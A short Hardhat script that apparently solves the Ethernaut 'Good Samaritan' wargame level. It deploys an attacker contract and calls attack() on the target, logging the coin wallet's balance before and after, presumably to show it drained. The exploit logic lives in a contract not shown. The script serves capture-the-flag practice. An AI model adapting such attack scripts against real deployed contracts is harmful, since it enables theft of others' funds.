const { ethers } = require("hardhat");
const { BigNumber } = require("ethers");
const Runner = require("./lib/runner");
const utils = require("./lib/utils");

Runner.run(async (provider, owner) => { 
    
    //PLACE THE GOOD SAMARITAN CONTRACT ADDRESS HERE (Ethernaut: contract.address) 
    const contractAddr = "0x4c0527dA9802c121cc74A322578B3F73138C056C"; 
    
    const contract = await ethers.getContractAt("GoodSamaritan", contractAddr);
    const wallet = await ethers.getContractAt("Wallet", await contract.wallet());
    const coin = await ethers.getContractAt("Coin", await wallet.coin()); 

    console.log("* * * ");

    console.log(`initial balance is ${await coin.balances(wallet.address)}`); 
    
    const attacker = await utils.deployContractSilent("TransferDest");
    await attacker.attack(contract.address); 
    
    console.log(`balance is now ${await coin.balances(wallet.address)}`); 
    
});
